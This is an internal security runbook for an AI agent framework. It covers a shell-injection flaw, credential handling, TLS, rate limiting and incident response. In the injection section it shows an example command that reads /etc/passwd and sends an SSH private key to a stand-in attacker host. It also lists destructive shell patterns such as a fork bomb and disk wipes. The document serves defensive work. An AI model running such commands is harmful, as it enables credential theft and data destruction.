# Security Runbook
## LuminaMind Deep Agent Framework

> **Classification**: Internal Use  
> **Last Updated**: November 26, 2025  
> **On-Call**: security@yourcompany.com

---

## Quick Reference

### 🔴 Critical Vulnerabilities (Fix Immediately)

| Vulnerability | Location | CVSS | Status |
|---------------|----------|------|--------|
| Shell Injection | `py_tools/shell.py:26` | 9.8 | ⏳ OPEN |
| Exposed Credentials | `deep_agent.py:153` | 8.5 | ⏳ OPEN |
| No TLS Verification | `py_tools/web_*.py` | 7.5 | ⏳ OPEN |
| No Rate Limiting | All tools | 6.5 | ⏳ OPEN |

### Emergency Contacts

- **Security Team**: security@yourcompany.com
- **On-Call Engineer**: +1-XXX-XXX-XXXX
- **Incident Commander**: eng-lead@yourcompany.com

---

## 1. Vulnerability Assessment

### 1.1 Shell Injection (CRITICAL)

**CVSS Score**: 9.8 (Critical)  
**CWE**: CWE-78 (OS Command Injection)  
**Affected**: `luminamind/py_tools/shell.py`

#### Vulnerable Code
```python
# LINE 26 - VULNERABLE
subprocess.run(
    command,
    shell=True,  # ⚠️ ALLOWS INJECTION
    cwd=str(safe_cwd),
    ...
)
```

#### Attack Vector
```bash
# Attacker input:
command = "ls; cat /etc/passwd; curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa)"

# Executed as:
subprocess.run("ls; cat /etc/passwd; curl...", shell=True)
# → Arbitrary command execution
```

#### Impact
- **Confidentiality**: HIGH - Can read any file
- **Integrity**: HIGH - Can modify any file
- **Availability**: HIGH - Can crash/delete system

#### Fix (IMMEDIATE)
```python
import shlex

@tool("shell")
def shell(command: str, cwd: Optional[str] = None, timeout_ms: Optional[int] = None) -> dict:
    """Execute a shell command safely."""
    # Step 1: Parse command safely
    try:
        cmd_list = shlex.split(command)
    except ValueError as e:
        return {"error": True, "message": f"Invalid command: {e}"}
    
    # Step 2: Whitelist allowed commands (CRITICAL)
    ALLOWED_COMMANDS = {
        'ls', 'cat', 'grep', 'find', 'git',
        'npm', 'yarn', 'python', 'pytest',
        'echo', 'pwd', 'which'
    }
    
    if cmd_list[0] not in ALLOWED_COMMANDS:
        return {
            "error": True,
            "message": f"Command '{cmd_list[0]}' not allowed. Allowed: {ALLOWED_COMMANDS}"
        }
    
    # Step 3: Execute WITHOUT shell=True
    try:
        completed = subprocess.run(
            cmd_list,  # List, not string
            shell=False,  # NO SHELL INTERPRETATION
            cwd=str(safe_cwd),
            text=True,
            capture_output=True,
            timeout=timeout,
            check=False
        )
        # ... rest remains same
```

#### Verification
```python
# Test cases
def test_shell_injection_blocked():
    # Should fail
    result = shell("ls; rm -rf /")
    assert result["error"] is True
    assert "not allowed" in result["message"]
    
    # Should succeed
    result = shell("ls -la")
    assert result["error"] is False
```

---

### 1.2 Exposed API Credentials (HIGH)

**CVSS Score**: 8.5 (High)  
**CWE**: CWE-798 (Hardcoded Credentials)  
**Affected**: `luminamind/deep_agent.py:153`

#### Vulnerable Code
```python
# LINE 153
ChatOpenAI(
    openai_api_key=os.environ.get("GLM_API_KEY"),  # ⚠️ In .env (might be in git)
    openai_api_base="https://api.z.ai/api/paas/v4/",  # ⚠️ Hardcoded
)
```

#### Current Risk
✅ `.env` is in `.gitignore` (good)  
⚠️ But if `.env` was ever committed, keys are in git history forever  
⚠️ Environment variables visible via `ps aux`, container inspect, etc.

#### Fix (Phase 1: Immediate - Use Env Vars Properly)
```bash
# Ensure .env is gitignored
echo ".env" >> .gitignore

# Check git history for exposed secrets
git log --all --full-history --source -- '*.env*'

# If secrets were exposed, ROTATE IMMEDIATELY:
# 1. Generate new API keys
# 2. Update .env
# 3. Deploy
# 4. Deactivate old keys
```

#### Fix (Phase 2: Week 2 - Secrets Manager)
```python
# Install: pip install hvac boto3

from hvac import Client as VaultClient

class SecretsManager:
    def __init__(self):
        self.vault_url = os.getenv("VAULT_ADDR")
        self.vault_token = os.getenv("VAULT_TOKEN")
        self.client = VaultClient(url=self.vault_url, token=self.vault_token)
    
    def get_secret(self, path: str, key: str):
        """Fetch secret from Vault."""
        try:
            secret = self.client.secrets.kv.v2.read_secret_version(path=path)
            return secret['data']['data'][key]
        except Exception as e:
            logger.error(f"Failed to fetch secret {path}/{key}: {e}")
            # Fallback to environment variable (for local dev)
            return os.getenv(key)

# Usage
secrets = SecretsManager()
api_key = secrets.get_secret("luminamind/api-keys", "glm_api_key")
```

#### Vault Setup (Kubernetes)
```yaml
# vault-setup.sh
vault kv put secret/luminamind/api-keys \
    glm_api_key="${GLM_API_KEY}" \
    serper_api_key="${SERPER_API_KEY}" \
    google_api_key="${GOOGLE_API_KEY}"

# K8s integration
apiVersion: v1
kind: ServiceAccount
metadata:
  name: luminamind
  annotations:
    vault.hashicorp.com/role: "luminamind"
```

---

### 1.3 No TLS Verification (HIGH)

**CVSS Score**: 7.5 (High)  
**CWE**: CWE-295 (Improper Certificate Validation)  
**Affected**: All web request tools

#### Vulnerable Code
```python
# py_tools/web_search.py:75
response = requests.get(url, params=params, headers=headers, timeout=30)
# Missing: verify=True

# py_tools/web_markdown.py:16
response = requests.get(url, timeout=30)
# Missing: verify=True
```

#### Attack Vector
- Man-in-the-middle (MITM) attack
- SSL stripping
- Certificate spoofing

#### Fix (IMMEDIATE)
```python
# Create a secure session factory
# New file: luminamind/utils/http_client.py

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def create_secure_session():
    """Create HTTP session with TLS verification and retries."""
    session = requests.Session()
    
    # ENFORCE TLS VERIFICATION
    session.verify = True
    
    # Optional: Pin certificates for critical APIs
    # session.verify = '/path/to/trusted-ca-bundle.crt'
    
    # Retry logic
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    
    return session

# Usage in all tools
from luminamind.utils.http_client import create_secure_session

@tool("web_search")
def web_search(query: str, ...):
    session = create_secure_session()
    response = session.get(url, timeout=30)  # verify=True by default
```

#### Verification
```python
# Test TLS enforcement
def test_tls_required():
    # Should work
    response = session.get("https://google.com")
    assert response.status_code == 200
    
    # Should fail (self-signed cert)
    with pytest.raises(requests.exceptions.SSLError):
        session.get("https://self-signed.badssl.com/")
```

---

### 1.4 No Rate Limiting (MEDIUM)

**CVSS Score**: 6.5 (Medium)  
**CWE**: CWE-770 (Allocation of Resources Without Limits)  
**Affected**: All tools

#### Risk
- DoS attacks (exhaust API quotas)
- Unexpected costs ($1000s in LLM API bills)
- Service degradation

#### Fix
```python
# Install: pip install slowapi redis

from slowapi import Limiter
from slowapi.util import get_remote_address
import redis

# Initialize
rate_limiter = Limiter(
    key_func=get_remote_address,
    storage_uri=os.getenv("REDIS_URL", "redis://localhost:6379")
)

# Define per-tool limits
RATE_LIMITS = {
    "web_search": "10/minute",   # Max 10 searches/minute per user
    "web_crawl": "20/minute",    # Max 20 crawls/minute
    "shell": "30/minute",        # Max 30 commands/minute
    "get_weather": "100/minute", # Weather is cheap
}

# Apply to tools
@rate_limiter.limit(RATE_LIMITS["web_search"])
@tool("web_search")
def web_search(query: str, limit: Optional[int] = None) -> dict:
    # Implementation
    pass
```

#### Monitoring
```python
# Track rate limit violations
from prometheus_client import Counter

RATE_LIMIT_EXCEEDED = Counter(
    'rate_limit_exceeded_total',
    'Number of rate limit violations',
    ['tool_name', 'user_id']
)

# Alert if too many violations
# Grafana alert: rate(rate_limit_exceeded_total[5m]) > 10
```

---

## 2. Security Best Practices

### Input Validation

**All user inputs must be validated**:
```python
from pydantic import BaseModel, validator, constr

class ShellCommandInput(BaseModel):
    command: constr(max_length=1000)
    cwd: Optional[str]
    timeout_ms: Optional[int]
    
    @validator('command')
    def validate_command(cls, v):
        # Block dangerous patterns
        dangerous_patterns = [
            'rm -rf /',
            'dd if=',
            ':(){ :|:& };:',  # Fork bomb
            'chmod 777',
            '> /dev/sd',       # Disk wipe
        ]
        
        for pattern in dangerous_patterns:
            if pattern in v:
                raise ValueError(f"Dangerous pattern detected: {pattern}")
        
        return v
    
    @validator('timeout_ms')
    def validate_timeout(cls, v):
        if v and (v < 100 or v > 300000):  # 100ms to 5 min
            raise ValueError("Timeout must be 100ms-300s")
        return v

# Usage
try:
    validated = ShellCommandInput(
        command=user_input,
        cwd=cwd,
        timeout_ms=timeout
    )
except ValidationError as e:
    return {"error": True, "message": str(e)}
```

### Path Traversal Prevention

**Already implemented** in `py_tools/safety.py`, but add logging:
```python
def ensure_path_allowed(target_path: str) -> Path:
    """Ensure path is within allowed root."""
    resolved = Path(target_path).expanduser().resolve()
    
    try:
        resolved.relative_to(_DEFAULT_ROOT)
    except ValueError as exc:
        # LOG SECURITY EVENT
        logger.warning(
            "path_traversal_attempt",
            requested_path=target_path,
            resolved_path=str(resolved),
            allowed_root=str(_DEFAULT_ROOT)
        )
        
        # INCREMENT SECURITY METRIC
        SECURITY_VIOLATIONS.labels(type="path_traversal").inc()
        
        raise ValueError(
            f"Path not allowed: {resolved}. Allowed root: {_DEFAULT_ROOT}"
        ) from exc
    
    return resolved
```

### Audit Logging

**Log all security-sensitive operations**:
```python
import structlog

security_logger = structlog.get_logger("security")

def audit_log(action: str, **context):
    """Log security-relevant actions."""
    security_logger.info(
        action,
        timestamp=datetime.utcnow().isoformat(),
        **context
    )

# Usage
@tool("delete_file")
def delete_file(file_path: str):
    audit_log(
        "file_delete_attempt",
        file_path=file_path,
        user_id=get_current_user(),
        approved=False
    )
    
    # ... HITL approval ...
    
    audit_log(
        "file_delete_executed",
        file_path=file_path,
        user_id=get_current_user(),
        approved=True
    )
```

---

## 3. Incident Response

### Security Incident Playbook

#### Phase 1: Detection (0-5 minutes)
1. **Alert triggered** (Grafana, SIEM, user report)
2. **Initial triage**:
   - Severity classification (P0-P4)
   - Affected systems identified
   - Impact assessment

#### Phase 2: Containment (5-30 minutes)
1. **P0 (Critical)**:
   - Isolate affected pods: `kubectl scale deployment luminamind --replicas=0`
   - Block malicious IPs at load balancer
   - Rotate compromised credentials
   
2. **P1 (High)**:
   - Enable additional logging
   - Increase monitoring frequency
   - Notify security team

#### Phase 3: Investigation (30 min - 4 hours)
1. **Collect evidence**:
   ```bash
   # Export logs
   kubectl logs -l app=luminamind --since=1h > incident-logs.txt
   
   # Export metrics
   curl http://prometheus:9090/api/v1/query_range?query=... > metrics.json
   
   # Snapshot database
   kubectl exec redis-0 -- redis-cli BGSAVE
   ```

2. **Root cause analysis**:
   - Review audit logs
   - Trace malicious requests
   - Identify vulnerability

#### Phase 4: Remediation (4 hours - 1 day)
1. **Deploy fix**:
   - Patch vulnerability
   - Update security controls
   - Rotate credentials

2. **Verify**:
   ```bash
   # Run security tests
   pytest tests/security/ -v
   
   # Scan with Bandit
   bandit -r luminamind -ll
   
   # Vulnerability scan
   trivy image luminamind:latest
   ```

#### Phase 5: Recovery (1-2 days)
1. **Restore service**:
   ```bash
   kubectl scale deployment luminamind --replicas=3
   kubectl rollout status deployment/luminamind
   ```

2. **Monitor closely**:
   - Watch for anomalies
   - Verify no reinfection

#### Phase 6: Post-Mortem (1 week)
1. **Document**:
   - Timeline
   - Root cause
   - Fixes applied
   - Preventive measures

2. **Share learnings** with team

---

## 4. Security Checklist

### Pre-Deployment

- [ ] All critical vulnerabilities fixed
- [ ] Secrets in Vault (not .env)
- [ ] TLS verification enabled
- [ ] Rate limiting configured
- [ ] Input validation on all tools
- [ ] Audit logging enabled
- [ ] Security tests passing
- [ ] Bandit scan clean (no high/critical)
- [ ] Container image scanned (Trivy)
- [ ] Network policies configured

### Weekly

- [ ] Review audit logs for anomalies
- [ ] Check security dashboards
- [ ] Dependency vulnerability scan (`safety check`)
- [ ] Review access logs

### Monthly

- [ ] Rotate secrets
- [ ] Review and update WAF rules
- [ ] Penetration testing (automated)
- [ ] Security training for team

### Quarterly

- [ ] External penetration test
- [ ] Security architecture review
- [ ] Update threat model
- [ ] Compliance audit (if applicable)

---

## 5. Security Monitoring

### Metrics to Track

```prometheus
# Failed authentication attempts
rate(auth_failures_total[5m]) > 10

# Path traversal attempts
rate(path_traversal_attempts_total[5m]) > 1

# Rate limit violations
rate(rate_limit_exceeded_total[5m]) > 50

# Suspicious shell commands
shell_dangerous_patterns_blocked_total > 0

# TLS errors
rate(tls_verification_errors_total[5m]) > 5
```

### Grafana Alerts

| Alert | Condition | Severity | Action |
|-------|-----------|----------|--------|
| Multiple failed auth | >10/5min | High | Block IP |
| Path traversal attempt | >1/5min | Critical | Investigate immediately |
| High rate limit violations | >50/5min | Medium | Check for bot |
| Shell injection blocked | >0 | Critical | Page security team |
| TLS verification failure | >5/5min | High | Check certificates |

---

## 6. Compliance

### GDPR (если applicable)
- [ ] User data encrypted at rest
- [ ] User data encrypted in transit
- [ ] Right to deletion implemented
- [ ] Data retention policy enforced
- [ ] Privacy policy updated

### SOC 2 (если applicable)
- [ ] Access controls documented
- [ ] Audit logs retained 1 year
- [ ] Incident response tested
- [ ] Backups encrypted
- [ ] Employee training completed

---

## 7. Tools & Commands

### Security Scanning

```bash
# Static analysis
bandit -r luminamind -f json -o bandit-report.json

# Dependency vulnerabilities
safety check -r requirements.txt

# Container scanning
trivy image luminamind:latest --severity HIGH,CRITICAL

# Secret scanning (in git history)
gitleaks detect --source . --verbose

# SAST (Static Application Security Testing)
semgrep --config=auto luminamind/
```

### Forensics

```bash
# Export pod logs
kubectl logs <pod-name> --since=24h > forensics/logs.txt

# Get pod events
kubectl get events --field-selector involvedObject.name=<pod-name>

# Exec into pod for investigation (if still running)
kubectl exec -it <pod-name> -- /bin/bash

# Extract Redis data
kubectl exec redis-0 -- redis-cli --rdb /tmp/dump.rdb
kubectl cp redis-0:/tmp/dump.rdb ./forensics/redis-dump.rdb

# Network capture (if needed)
kubectl exec <pod-name> -- tcpdump -i any -w /tmp/capture.pcap
kubectl cp <pod-name>:/tmp/capture.pcap ./forensics/network.pcap
```

---

**Runbook Owner**: Security Team  
**Last Drill**: TBD  
**Next Drill**: TBD (quarterly)  
**Emergency Hotline**: +1-XXX-XXX-XXXX
